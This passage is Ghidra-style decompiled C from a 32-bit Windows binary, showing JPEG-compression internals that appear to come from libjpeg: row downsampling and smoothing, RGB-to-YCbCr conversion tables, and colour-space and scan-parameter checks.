        puVar1 = puVar1 + 1;
        piVar3 = piVar3 + 0x15;
      } while (_param_2 < param_1[0xf]);
    }
  }
  else {
    puVar1[1] = FUN_0040d593;
    FUN_0040d717();
  }
  return;
}



void __thiscall FUN_0040d8c3(void *this,int param_1,int param_2,int param_3)

{
  int in_EAX;
  void *_Dst;
  int iVar1;
  undefined4 local_8;
  
  iVar1 = 0;
  if ((0 < in_EAX - param_3) && (local_8 = this, 0 < param_2)) {
    do {
      _Dst = (void *)(*(int *)(param_1 + iVar1 * 4) + param_3);
      local_8 = (void *)CONCAT31(local_8._1_3_,*(undefined *)((int)_Dst + -1));
      _memset(_Dst,(int)local_8,in_EAX - param_3);
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_2);
  }
  return;
}



void __cdecl FUN_0040d8ff(int param_1,int *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  int iVar2;
  code **ppcVar3;
  int local_8;
  
  local_8 = 0;
  iVar2 = *(int *)(param_1 + 0x44);
  if (0 < *(int *)(param_1 + 0x3c)) {
    ppcVar3 = (code **)(*(int *)(param_1 + 0x154) + 0xc);
    iVar1 = param_4 - (int)param_2;
    do {
      (**ppcVar3)(param_1,iVar2,*param_2 + param_3 * 4,
                  *(int *)(iVar1 + (int)param_2) + *(int *)(iVar2 + 0xc) * param_5 * 4);
      iVar2 = iVar2 + 0x54;
      local_8 = local_8 + 1;
      param_2 = param_2 + 1;
      ppcVar3 = ppcVar3 + 1;
    } while (local_8 < *(int *)(param_1 + 0x3c));
  }
  return;
}



void __cdecl FUN_0040d975(void *param_1,int param_2,int *param_3,int param_4)

{
  int iVar1;
  int iVar2;
  undefined *puVar3;
  int iVar4;
  int iVar5;
  byte *pbVar6;
  int iVar7;
  int local_1c;
  int local_18;
  int *local_14;
  int local_10;
  int *local_8;
  
  iVar4 = *(int *)((int)param_1 + 0xd8) / *(int *)(param_2 + 8);
  iVar2 = *(int *)(param_2 + 0x1c);
  iVar5 = *(int *)((int)param_1 + 0xdc) / *(int *)(param_2 + 0xc);
  FUN_0040d8c3(param_1,(int)param_3,*(int *)((int)param_1 + 0xdc),*(int *)((int)param_1 + 0x1c));
  param_1 = (void *)0x0;
  if (0 < *(int *)(param_2 + 0xc)) {
    local_14 = param_3;
    do {
      local_10 = 0;
      puVar3 = *(undefined **)(param_4 + (int)param_1 * 4);
      for (iVar1 = iVar2 << 3; iVar1 != 0; iVar1 = iVar1 + -1) {
        iVar7 = 0;
        if (0 < iVar5) {
          local_8 = local_14;
          local_1c = iVar5;
          do {
            pbVar6 = (byte *)(*local_8 + local_10);
            local_18 = iVar4;
            if (0 < iVar4) {
              do {
                iVar7 = iVar7 + (uint)*pbVar6;
                pbVar6 = pbVar6 + 1;
                local_18 = local_18 + -1;
              } while (local_18 != 0);
            }
            local_8 = local_8 + 1;
            local_1c = local_1c + -1;
          } while (local_1c != 0);
        }
        *puVar3 = (char)((iVar7 + (iVar5 * iVar4) / 2) / (iVar5 * iVar4));
        local_10 = local_10 + iVar4;
        puVar3 = puVar3 + 1;
      }
      local_14 = local_14 + iVar5;
      param_1 = (void *)((int)param_1 + 1);
    } while ((int)param_1 < *(int *)(param_2 + 0xc));
  }
  return;
}



void __cdecl FUN_0040da62(int param_1,undefined4 param_2,int param_3,int param_4)

{
  void *this;
  
  FUN_00409e55(param_3,0,param_4,0,*(int *)(param_1 + 0xdc),*(size_t *)(param_1 + 0x1c));
  FUN_0040d8c3(this,param_4,*(int *)(param_1 + 0xdc),*(int *)(param_1 + 0x1c));
  return;
}



void __cdecl FUN_0040daa1(void *param_1,int param_2,byte **param_3,int param_4)

{
  int iVar1;
  int iVar2;
  byte *pbVar3;
  int iVar4;
  undefined *puVar5;
  int local_8;
  
  iVar2 = *(int *)(param_2 + 0x1c);
  FUN_0040d8c3(param_1,(int)param_3,*(int *)((int)param_1 + 0xdc),*(int *)((int)param_1 + 0x1c));
  local_8 = 0;
  if (0 < *(int *)(param_2 + 0xc)) {
    iVar4 = param_4 - (int)param_3;
    do {
      param_1 = (void *)0x0;
      puVar5 = *(undefined **)(iVar4 + (int)param_3);
      pbVar3 = *param_3;
      for (iVar1 = iVar2 << 3; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar5 = (char)((int)((int)param_1 + (uint)*pbVar3 + (uint)pbVar3[1]) >> 1);
        puVar5 = puVar5 + 1;
        pbVar3 = pbVar3 + 2;
        param_1 = (void *)((uint)param_1 ^ 1);
      }
      local_8 = local_8 + 1;
      param_3 = param_3 + 1;
    } while (local_8 < *(int *)(param_2 + 0xc));
  }
  return;
}



void __cdecl FUN_0040db27(void *param_1,int param_2,byte **param_3,int param_4)

{
  byte *pbVar1;
  byte *pbVar2;
  int iVar3;
  byte bVar4;
  int iVar5;
  undefined *puVar6;
  byte *pbVar7;
  byte *pbVar8;
  int iVar9;
  byte **local_10;
  uint local_c;
  
  iVar5 = *(int *)(param_2 + 0x1c);
  FUN_0040d8c3(param_1,(int)param_3,*(int *)((int)param_1 + 0xdc),*(int *)((int)param_1 + 0x1c));
  param_1 = (void *)0x0;
  if (0 < *(int *)(param_2 + 0xc)) {
    local_10 = param_3;
    do {
      pbVar7 = *local_10;
      pbVar8 = local_10[1];
      local_c = 1;
      puVar6 = *(undefined **)(param_4 + (int)param_1 * 4);
      for (iVar3 = iVar5 << 3; iVar3 != 0; iVar3 = iVar3 + -1) {
        pbVar1 = pbVar7 + 1;
        pbVar2 = pbVar8 + 1;
        bVar4 = *pbVar7;
        iVar9 = *pbVar8 + local_c;
        local_c = local_c ^ 3;
        pbVar7 = pbVar7 + 2;
        pbVar8 = pbVar8 + 2;
        *puVar6 = (char)((int)((uint)bVar4 + iVar9 + (uint)*pbVar2 + (uint)*pbVar1) >> 2);
        puVar6 = puVar6 + 1;
      }
      local_10 = local_10 + 2;
      param_1 = (void *)((int)param_1 + 1);
    } while ((int)param_1 < *(int *)(param_2 + 0xc));
  }
  return;
}



void __cdecl FUN_0040dbc9(int param_1,int param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  byte *pbVar3;
  undefined *puVar4;
  byte *pbVar5;
  byte *pbVar6;
  byte *pbVar7;
  int iVar8;
  byte **this;
  int iVar9;
  int local_10;
  
  iVar2 = *(int *)(param_2 + 0x1c);
  this = (byte **)(param_3 + -4);
  FUN_0040d8c3(this,(int)this,*(int *)(param_1 + 0xdc) + 2,*(int *)(param_1 + 0x1c));
  local_10 = 0;
  iVar9 = *(int *)(param_1 + 0xb4) * -0x50 + 0x4000;
  iVar8 = *(int *)(param_1 + 0xb4) * 0x10;
  if (0 < *(int *)(param_2 + 0xc)) {
    do {
      pbVar3 = this[1];
      puVar4 = *(undefined **)(param_4 + local_10 * 4);
      pbVar5 = this[2];
      pbVar6 = *this;
      pbVar7 = this[3];
      *puVar4 = (char)(((uint)pbVar7[2] +
                       (uint)pbVar6[2] + (uint)*pbVar6 +
                       ((uint)pbVar3[2] +
                        (uint)pbVar5[2] + (uint)*pbVar3 + (uint)pbVar7[1] + (uint)pbVar6[1] +
                        (uint)*pbVar5 + (uint)*pbVar6) * 2 + (uint)*pbVar7 * 3) * iVar8 + 0x8000 +
                       ((uint)pbVar3[1] + (uint)pbVar5[1] + (uint)*pbVar3 + (uint)*pbVar5) * iVar9
                      >> 0x10);
      pbVar3 = pbVar3 + 2;
      pbVar7 = pbVar7 + 2;
      pbVar6 = pbVar6 + 2;
      pbVar5 = pbVar5 + 2;
      for (iVar1 = iVar2 * 8 + -2; puVar4 = puVar4 + 1, iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar4 = (char)(((uint)pbVar7[-1] +
                          ((uint)pbVar7[1] + (uint)pbVar6[1] + (uint)pbVar5[-1] + (uint)pbVar3[-1] +
                           (uint)*pbVar7 + (uint)pbVar5[2] + (uint)*pbVar6 + (uint)pbVar3[2]) * 2 +
                          (uint)pbVar6[-1] + (uint)pbVar6[2] + (uint)pbVar7[2]) * iVar8 + 0x8000 +
                         ((uint)pbVar5[1] + (uint)pbVar3[1] + (uint)*pbVar5 + (uint)*pbVar3) * iVar9
                        >> 0x10);
        pbVar3 = pbVar3 + 2;
        pbVar7 = pbVar7 + 2;
        pbVar6 = pbVar6 + 2;
        pbVar5 = pbVar5 + 2;
      }
      local_10 = local_10 + 1;
      *puVar4 = (char)(((uint)pbVar6[-1] +
                       (uint)pbVar7[-1] + (uint)pbVar6[1] +
                       ((uint)*pbVar6 +
                        (uint)*pbVar7 + (uint)pbVar3[1] + (uint)pbVar5[-1] + (uint)pbVar3[-1] +
                        (uint)pbVar5[1] + (uint)pbVar6[1]) * 2 + (uint)pbVar7[1] * 3) * iVar8 +
                       0x8000 + ((uint)*pbVar3 + (uint)*pbVar5 + (uint)pbVar3[1] + (uint)pbVar5[1])
                                * iVar9 >> 0x10);
      this = this + 2;
    } while (local_10 < *(int *)(param_2 + 0xc));
  }
  return;
}



void __thiscall FUN_0040de2e(void *this,int param_1,int param_2,int param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  byte bVar3;
  int iVar4;
  undefined *puVar5;
  int iVar6;
  byte **ppbVar7;
  byte *pbVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  byte *pbVar12;
  byte *pbVar13;
  uint uVar14;
  int iVar15;
  
  iVar4 = *(int *)(param_2 + 0x1c);
  FUN_0040d8c3(this,param_3 + -4,*(int *)(param_1 + 0xdc) + 2,*(int *)(param_1 + 0x1c));
  piVar1 = (int *)(param_1 + 0xb4);
  param_1 = 0;
  iVar11 = (0x80 - *piVar1) * 0x200;
  iVar6 = *piVar1 * 0x40;
  if (0 < *(int *)(param_2 + 0xc)) {
    ppbVar7 = (byte **)(param_3 + 4);
    do {
      puVar5 = *(undefined **)(param_4 + param_1 * 4);
      uVar14 = (uint)*ppbVar7[-1];
      iVar15 = (uint)*ppbVar7[-2] + **ppbVar7 + uVar14;
      pbVar8 = *ppbVar7 + 1;
      pbVar13 = ppbVar7[-2] + 1;
      pbVar12 = ppbVar7[-1] + 1;
      iVar9 = (uint)*pbVar8 + (uint)*pbVar13 + (uint)*pbVar12;
      *puVar5 = (char)(((iVar15 * 2 - uVar14) + iVar9) * iVar6 + 0x8000 + uVar14 * iVar11 >> 0x10);
      for (iVar2 = iVar4 * 8 + -2; puVar5 = puVar5 + 1, iVar2 != 0; iVar2 = iVar2 + -1) {
        bVar3 = *pbVar12;
        pbVar12 = pbVar12 + 1;
        pbVar13 = pbVar13 + 1;
        pbVar8 = pbVar8 + 1;
        iVar10 = (uint)*pbVar8 + (uint)*pbVar13 + (uint)*pbVar12;
        *puVar5 = (char)(((iVar15 - (uint)bVar3) + iVar10 + iVar9) * iVar6 + 0x8000 +
                         (uint)bVar3 * iVar11 >> 0x10);
        iVar15 = iVar9;
        iVar9 = iVar10;
      }
      param_1 = param_1 + 1;
      *puVar5 = (char)(((iVar9 * 2 - (uint)*pbVar12) + iVar15) * iVar6 + 0x8000 +
                       (uint)*pbVar12 * iVar11 >> 0x10);
      ppbVar7 = ppbVar7 + 1;
    } while (param_1 < *(int *)(param_2 + 0xc));
  }
  return;
}



void __cdecl FUN_0040df7c(int *param_1)

{
  int iVar1;
  int iVar2;
  bool bVar3;
  code **ppcVar4;
  int *piVar5;
  code **ppcVar6;
  int local_c;
  
  bVar3 = true;
  ppcVar4 = (code **)(**(code **)param_1[1])(param_1,1,0x34);
  param_1[0x55] = (int)ppcVar4;
  *ppcVar4 = FUN_00408aec;
  ppcVar4[1] = FUN_0040d8ff;
  *(undefined *)(ppcVar4 + 2) = 0;
  if (*(char *)((int)param_1 + 0xb3) != '\0') {
    *(undefined4 *)(*param_1 + 0x14) = 0x19;
    (**(code **)*param_1)(param_1);
  }
  local_c = 0;
  if (0 < param_1[0xf]) {
    piVar5 = (int *)(param_1[0x11] + 0xc);
    ppcVar6 = ppcVar4 + 3;
    do {
      iVar1 = piVar5[-1];
      if ((iVar1 == param_1[0x36]) && (*piVar5 == param_1[0x37])) {
        if (param_1[0x2d] == 0) {
          *ppcVar6 = FUN_0040da62;
        }
        else {
          *ppcVar6 = FUN_0040de2e;
LAB_0040e00b:
          *(undefined *)(ppcVar4 + 2) = 1;
        }
      }
      else {
        iVar2 = param_1[0x36];
        if ((iVar1 * 2 == iVar2) && (*piVar5 == param_1[0x37])) {
          bVar3 = false;
          *ppcVar6 = FUN_0040daa1;
        }
        else if ((iVar1 * 2 == iVar2) && (*piVar5 * 2 == param_1[0x37])) {
          if (param_1[0x2d] != 0) {
            *ppcVar6 = FUN_0040dbc9;
            goto LAB_0040e00b;
          }
          *ppcVar6 = FUN_0040db27;
        }
        else if ((iVar2 % iVar1 == 0) && (param_1[0x37] % *piVar5 == 0)) {
          bVar3 = false;
          *ppcVar6 = FUN_0040d975;
        }
        else {
          *(undefined4 *)(*param_1 + 0x14) = 0x26;
          (**(code **)*param_1)(param_1);
        }
      }
      local_c = local_c + 1;
      piVar5 = piVar5 + 0x15;
      ppcVar6 = ppcVar6 + 1;
    } while (local_c < param_1[0xf]);
  }
  if ((param_1[0x2d] != 0) && (!bVar3)) {
    *(undefined4 *)(*param_1 + 0x14) = 99;
    (**(code **)(*param_1 + 4))(param_1,0);
  }
  return;
}



void __cdecl FUN_0040e0e2(int param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  iVar3 = *(int *)(param_1 + 0x150);
  iVar1 = (***(code ***)(param_1 + 4))(param_1,1,0x2000);
  *(int *)(iVar3 + 8) = iVar1;
  iVar4 = 0;
  iVar5 = 0;
  local_14 = 0;
  local_10 = 0;
  local_8 = 0;
  param_1 = 0;
  local_c = 0x807fff;
  iVar3 = 0x8000;
  piVar2 = (int *)(iVar1 + 0x800);
  do {
    piVar2[0x100] = param_1;
    piVar2[0x200] = local_8;
    piVar2[0x300] = local_c;
    piVar2[0x400] = local_10;
    *piVar2 = iVar3;
    piVar2[-0x200] = iVar4;
    piVar2[-0x100] = iVar5;
    piVar2[0x500] = local_14;
    iVar3 = iVar3 + 0x1d2f;
    iVar4 = iVar4 + 0x4c8b;
    piVar2 = piVar2 + 1;
    iVar5 = iVar5 + 0x9646;
    param_1 = param_1 + -0x2b33;
    local_14 = local_14 + -0x14d1;
    local_10 = local_10 + -0x6b2f;
    local_c = local_c + 0x8000;
    local_8 = local_8 + -0x54cd;
  } while (iVar3 < 0x1d91d2);
  return;
}



void __cdecl FUN_0040e1a6(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  byte *pbVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  undefined *puVar12;
  int local_8;
  
  param_5 = param_5 + -1;
  iVar3 = *(int *)(param_1 + 0x1c);
  iVar4 = *(int *)(*(int *)(param_1 + 0x150) + 8);
  if (-1 < param_5) {
    iVar6 = param_4 << 2;
    do {
      piVar1 = (int *)(iVar6 + *param_3);
      piVar2 = (int *)(iVar6 + param_3[2]);
      pbVar5 = *param_2;
      puVar12 = *(undefined **)(iVar6 + param_3[1]);
      iVar6 = iVar6 + 4;
      if (iVar3 != 0) {
        iVar7 = *piVar1 - (int)puVar12;
        iVar8 = *piVar2 - (int)puVar12;
        local_8 = iVar3;
        do {
          uVar10 = (uint)pbVar5[2];
          uVar9 = (uint)pbVar5[1];
          uVar11 = (uint)*pbVar5;
          puVar12[iVar7] =
               (char)((uint)(*(int *)(iVar4 + 0x800 + uVar10 * 4) +
                             *(int *)(iVar4 + 0x400 + uVar9 * 4) + *(int *)(iVar4 + uVar11 * 4)) >>
                     0x10);
          pbVar5 = pbVar5 + 3;
          *puVar12 = (char)((uint)(*(int *)(iVar4 + 0x1400 + uVar10 * 4) +
                                   *(int *)(iVar4 + 0x1000 + uVar9 * 4) +
                                  *(int *)(iVar4 + 0xc00 + uVar11 * 4)) >> 0x10);
          puVar12[iVar8] =
               (char)((uint)(*(int *)(iVar4 + 0x1c00 + uVar10 * 4) +
                             *(int *)(iVar4 + 0x1800 + uVar9 * 4) +
                            *(int *)(iVar4 + 0x1400 + uVar11 * 4)) >> 0x10);
          puVar12 = puVar12 + 1;
          local_8 = local_8 + -1;
        } while (local_8 != 0);
      }
      param_5 = param_5 + -1;
      param_2 = param_2 + 1;
    } while (-1 < param_5);
  }
  return;
}



void __cdecl FUN_0040e2a0(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  byte *pbVar7;
  int iVar8;
  uint uVar9;
  
  param_5 = param_5 + -1;
  uVar4 = *(uint *)(param_1 + 0x1c);
  iVar5 = *(int *)(*(int *)(param_1 + 0x150) + 8);
  if (-1 < param_5) {
    iVar8 = param_4 << 2;
    do {
      iVar6 = *(int *)(iVar8 + *param_3);
      pbVar7 = *param_2;
      iVar8 = iVar8 + 4;
      uVar9 = 0;
      if (uVar4 != 0) {
        do {
          bVar3 = *pbVar7;
          pbVar1 = pbVar7 + 2;
          pbVar2 = pbVar7 + 1;
          pbVar7 = pbVar7 + 3;
          *(char *)(uVar9 + iVar6) =
               (char)((uint)(*(int *)(iVar5 + 0x800 + (uint)*pbVar1 * 4) +
                             *(int *)(iVar5 + 0x400 + (uint)*pbVar2 * 4) +
                            *(int *)(iVar5 + (uint)bVar3 * 4)) >> 0x10);
          uVar9 = uVar9 + 1;
        } while (uVar9 < uVar4);
      }
      param_5 = param_5 + -1;
      param_2 = param_2 + 1;
    } while (-1 < param_5);
  }
  return;
}



void __cdecl FUN_0040e321(int param_1,byte **param_2,int *param_3,int param_4,int param_5)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  byte *pbVar12;
  int iVar13;
  undefined *puVar14;
  int local_c;
  
  param_5 = param_5 + -1;
  iVar4 = *(int *)(param_1 + 0x1c);
  iVar5 = *(int *)(*(int *)(param_1 + 0x150) + 8);
  if (-1 < param_5) {
    iVar6 = param_4 << 2;
    do {
      pbVar12 = *param_2;
      puVar14 = *(undefined **)(iVar6 + *param_3);
      piVar1 = (int *)(iVar6 + param_3[1]);
      param_2 = param_2 + 1;
      piVar2 = (int *)(iVar6 + param_3[2]);
      piVar3 = (int *)(iVar6 + param_3[3]);
      iVar6 = iVar6 + 4;
      if (iVar4 != 0) {
        iVar7 = *piVar3 - (int)puVar14;
        iVar8 = *piVar1 - (int)puVar14;
        iVar9 = *piVar2 - (int)puVar14;
        local_c = iVar4;
        do {
          iVar10 = 0xff - (uint)*pbVar12;
          iVar13 = 0xff - (uint)pbVar12[1];
          iVar11 = 0xff - (uint)pbVar12[2];
          puVar14[iVar7] = pbVar12[3];
          pbVar12 = pbVar12 + 4;
          *puVar14 = (char)((uint)(*(int *)(iVar5 + 0x800 + iVar11 * 4) +
                                   *(int *)(iVar5 + 0x400 + iVar13 * 4) +
                                  *(int *)(iVar5 + iVar10 * 4)) >> 0x10);
          puVar14[iVar8] =
               (char)((uint)(*(int *)(iVar5 + 0x1400 + iVar11 * 4) +
                             *(int *)(iVar5 + 0x1000 + iVar13 * 4) +
                            *(int *)(iVar5 + 0xc00 + iVar10 * 4)) >> 0x10);
          puVar14[iVar9] =
               (char)((uint)(*(int *)(iVar5 + 0x1c00 + iVar11 * 4) +
                             *(int *)(iVar5 + 0x1800 + iVar13 * 4) +
                            *(int *)(iVar5 + 0x1400 + iVar10 * 4)) >> 0x10);
          puVar14 = puVar14 + 1;
          local_c = local_c + -1;
        } while (local_c != 0);
      }
      param_5 = param_5 + -1;
    } while (-1 < param_5);
  }
  return;
}



void __cdecl FUN_0040e454(int param_1,undefined4 *param_2,int *param_3,int param_4,int param_5)

{
  undefined uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  undefined *puVar5;
  uint uVar6;
  int iVar7;
  
  param_5 = param_5 + -1;
  uVar2 = *(uint *)(param_1 + 0x1c);
  iVar3 = *(int *)(param_1 + 0x24);
  if (-1 < param_5) {
    iVar7 = param_4 << 2;
    do {
      puVar5 = (undefined *)*param_2;
      iVar4 = *(int *)(iVar7 + *param_3);
      uVar6 = 0;
      param_2 = param_2 + 1;
      iVar7 = iVar7 + 4;
      if (uVar2 != 0) {
        do {
          uVar1 = *puVar5;
          puVar5 = puVar5 + iVar3;
          *(undefined *)(uVar6 + iVar4) = uVar1;
          uVar6 = uVar6 + 1;
        } while (uVar6 < uVar2);
      }
      param_5 = param_5 + -1;
    } while (-1 < param_5);
  }
  return;
}



void __cdecl FUN_0040e4a7(int param_1,int *param_2,int param_3,int param_4,int param_5)

{
  undefined uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  undefined *puVar8;
  
  param_5 = param_5 + -1;
  iVar2 = *(int *)(param_1 + 0x3c);
  uVar3 = *(uint *)(param_1 + 0x1c);
  if (-1 < param_5) {
    iVar6 = param_4 << 2;
    do {
      iVar5 = 0;
      if (0 < iVar2) {
        do {
          iVar4 = *(int *)(iVar6 + *(int *)(param_3 + iVar5 * 4));
          uVar7 = 0;
          if (uVar3 != 0) {
            puVar8 = (undefined *)(*param_2 + iVar5);
            do {
              uVar1 = *puVar8;
              puVar8 = puVar8 + iVar2;
              *(undefined *)(uVar7 + iVar4) = uVar1;
              uVar7 = uVar7 + 1;
            } while (uVar7 < uVar3);
          }
          iVar5 = iVar5 + 1;
        } while (iVar5 < iVar2);
      }
      param_2 = param_2 + 1;
      iVar6 = iVar6 + 4;
      param_5 = param_5 + -1;
    } while (-1 < param_5);
  }
  return;
}



void __cdecl FUN_0040e50c(int *param_1)

{
  int iVar1;
  code **ppcVar2;
  bool bVar3;
  
  ppcVar2 = (code **)(**(code **)param_1[1])(param_1,1,0xc);
  param_1[0x54] = (int)ppcVar2;
  *ppcVar2 = FUN_00408aec;
  iVar1 = param_1[10];
  if (iVar1 == 1) {
    bVar3 = param_1[9] == 1;
LAB_0040e559:
    if (!bVar3) {
LAB_0040e55b:
      *(undefined4 *)(*param_1 + 0x14) = 9;
      (**(code **)*param_1)(param_1);
    }
  }
  else {
    if (1 < iVar1) {
      if (iVar1 < 4) {
        bVar3 = param_1[9] == 3;
      }
      else {
        if (5 < iVar1) goto LAB_0040e54f;
        bVar3 = param_1[9] == 4;
      }
      goto LAB_0040e559;
    }
LAB_0040e54f:
    if (param_1[9] < 1) goto LAB_0040e55b;
  }
  iVar1 = param_1[0x10];
  if (iVar1 == 1) {
    if (param_1[0xf] != 1) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      (**(code **)*param_1)(param_1);
    }
    iVar1 = param_1[10];
    if (iVar1 == 1) {
LAB_0040e695:
      ppcVar2[1] = FUN_0040e454;
      return;
    }
    if (iVar1 == 2) {
      *ppcVar2 = FUN_0040e0e2;
      ppcVar2[1] = FUN_0040e2a0;
      return;
    }
    if (iVar1 == 3) goto LAB_0040e695;
LAB_0040e5e0:
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    (**(code **)*param_1)(param_1);
  }
  else {
    if (iVar1 == 2) {
      if (param_1[0xf] != 3) {
        *(undefined4 *)(*param_1 + 0x14) = 10;
        (**(code **)*param_1)(param_1);
      }
      bVar3 = param_1[10] == 2;
LAB_0040e5de:
      if (!bVar3) goto LAB_0040e5e0;
    }
    else {
      if (iVar1 == 3) {
        if (param_1[0xf] != 3) {
          *(undefined4 *)(*param_1 + 0x14) = 10;
          (**(code **)*param_1)(param_1);
        }
        if (param_1[10] == 2) {
          *ppcVar2 = FUN_0040e0e2;
          ppcVar2[1] = FUN_0040e1a6;
          return;
        }
        bVar3 = param_1[10] == 3;
        goto LAB_0040e5de;
      }
      if (iVar1 == 4) {
        if (param_1[0xf] != 4) {
          *(undefined4 *)(*param_1 + 0x14) = 10;
          (**(code **)*param_1)(param_1);
        }
        bVar3 = param_1[10] == 4;
        goto LAB_0040e5de;
      }
      if (iVar1 == 5) {
        if (param_1[0xf] != 4) {
          *(undefined4 *)(*param_1 + 0x14) = 10;
          (**(code **)*param_1)(param_1);
        }
        if (param_1[10] == 4) {
          *ppcVar2 = FUN_0040e0e2;
          ppcVar2[1] = FUN_0040e321;
          return;
        }
        bVar3 = param_1[10] == 5;
        goto LAB_0040e5de;
      }
      if ((iVar1 != param_1[10]) || (param_1[0xf] != param_1[9])) {
        *(undefined4 *)(*param_1 + 0x14) = 0x1b;
        (**(code **)*param_1)(param_1);
      }
    }
    ppcVar2[1] = FUN_0040e4a7;
  }
  return;
}



void FUN_0040e6a1(void)

{
  int iVar1;
  int iVar2;
  int *unaff_ESI;
  int *piVar3;
  undefined4 *puVar4;
  
  iVar2 = 0;
  if ((((unaff_ESI[8] == 0) || (unaff_ESI[7] == 0)) || (unaff_ESI[0xf] < 1)) || (unaff_ESI[9] < 1))
  {
    *(undefined4 *)(*unaff_ESI + 0x14) = 0x20;
    (**(code **)*unaff_ESI)();
  }
  if ((0xffdc < unaff_ESI[8]) || (0xffdc < unaff_ESI[7])) {
    *(undefined4 *)(*unaff_ESI + 0x14) = 0x29;
    *(undefined4 *)(*unaff_ESI + 0x18) = 0xffdc;
    (**(code **)*unaff_ESI)();
  }
  if (unaff_ESI[0xe] != 8) {
    *(undefined4 *)(*unaff_ESI + 0x14) = 0xf;
    *(int *)(*unaff_ESI + 0x18) = unaff_ESI[0xe];
    (**(code **)*unaff_ESI)();
  }
  if (10 < unaff_ESI[0xf]) {
    *(undefined4 *)(*unaff_ESI + 0x14) = 0x1a;
    *(int *)(*unaff_ESI + 0x18) = unaff_ESI[0xf];
    *(undefined4 *)(*unaff_ESI + 0x1c) = 10;
    (**(code **)*unaff_ESI)();
  }
  unaff_ESI[0x36] = 1;
  unaff_ESI[0x37] = 1;
  if (0 < unaff_ESI[0xf]) {
    piVar3 = (int *)(unaff_ESI[0x11] + 0xc);
    do {
      if (((piVar3[-1] < 1) || (4 < piVar3[-1])) || ((*piVar3 < 1 || (4 < *piVar3)))) {
        *(undefined4 *)(*unaff_ESI + 0x14) = 0x12;
        (**(code **)*unaff_ESI)();
      }
      iVar1 = unaff_ESI[0x36];
      if (unaff_ESI[0x36] <= piVar3[-1]) {
        iVar1 = piVar3[-1];
      }
      unaff_ESI[0x36] = iVar1;
      iVar1 = unaff_ESI[0x37];
      if (unaff_ESI[0x37] <= *piVar3) {
        iVar1 = *piVar3;
      }
      iVar2 = iVar2 + 1;
      unaff_ESI[0x37] = iVar1;
      piVar3 = piVar3 + 0x15;
    } while (iVar2 < unaff_ESI[0xf]);
  }
  iVar2 = 0;
  if (0 < unaff_ESI[0xf]) {
    puVar4 = (undefined4 *)(unaff_ESI[0x11] + 0x24);
    do {
      puVar4[-8] = iVar2;
      *puVar4 = 8;
      iVar1 = FUN_00409e2d(puVar4[-7] * unaff_ESI[7],unaff_ESI[0x36] << 3);
      puVar4[-2] = iVar1;
      iVar1 = FUN_00409e2d(puVar4[-6] * unaff_ESI[8],unaff_ESI[0x37] << 3);
      puVar4[-1] = iVar1;
      iVar1 = FUN_00409e2d(puVar4[-7] * unaff_ESI[7],unaff_ESI[0x36]);
      puVar4[1] = iVar1;
      iVar1 = FUN_00409e2d(puVar4[-6] * unaff_ESI[8],unaff_ESI[0x37]);
      puVar4[2] = iVar1;
      *(undefined *)(puVar4 + 3) = 1;
      iVar2 = iVar2 + 1;
      puVar4 = puVar4 + 0x15;
    } while (iVar2 < unaff_ESI[0xf]);
  }
  iVar2 = FUN_00409e2d(unaff_ESI[8],unaff_ESI[0x37] << 3);
  unaff_ESI[0x38] = iVar2;
  return;
}



void FUN_0040e841(void)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  int *unaff_ESI;
  int *piVar4;
  bool bVar5;
  int local_a3c [640];
  int *local_3c;
  uint *local_38;
  uint local_34;
  uint local_30;
  uint local_2c;
  int *local_28;
  int *local_24;
  int *local_20;
  uint local_1c;
  int local_18;
  char local_14 [12];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  if (unaff_ESI[0x2a] < 1) {
    *(undefined4 *)(*unaff_ESI + 0x14) = 0x13;
    *(undefined4 *)(*unaff_ESI + 0x18) = 0;
    (**(code **)*unaff_ESI)();
  }
  piVar2 = (int *)unaff_ESI[0x2b];
  if ((piVar2[5] == 0) && (piVar2[6] == 0x3f)) {
    *(undefined *)(unaff_ESI + 0x35) = 0;
    if (0 < unaff_ESI[0xf]) {
      _memset(local_14,0,unaff_ESI[0xf]);
    }
  }
  else {
    *(undefined *)(unaff_ESI + 0x35) = 1;
    if (0 < unaff_ESI[0xf]) {
      piVar4 = local_a3c;
      for (iVar3 = (unaff_ESI[0xf] & 0xffffffU) << 6; iVar3 != 0; iVar3 = iVar3 + -1) {
        *piVar4 = -1;
        piVar4 = piVar4 + 1;
      }
    }
  }
  local_18 = 1;
  if (0 < unaff_ESI[0x2a]) {
    do {
      piVar4 = (int *)*piVar2;
      local_20 = piVar4;
      if (((int)piVar4 < 1) || (4 < (int)piVar4)) {
        *(undefined4 *)(*unaff_ESI + 0x14) = 0x1a;
        *(int **)(*unaff_ESI + 0x18) = piVar4;
        *(undefined4 *)(*unaff_ESI + 0x1c) = 4;
        (**(code **)*unaff_ESI)();
      }
      local_1c = 0;
      if (0 < (int)piVar4) {
        do {
          iVar3 = piVar2[local_1c + 1];
          if ((iVar3 < 0) || (unaff_ESI[0xf] <= iVar3)) {
            *(undefined4 *)(*unaff_ESI + 0x14) = 0x13;
            *(int *)(*unaff_ESI + 0x18) = local_18;
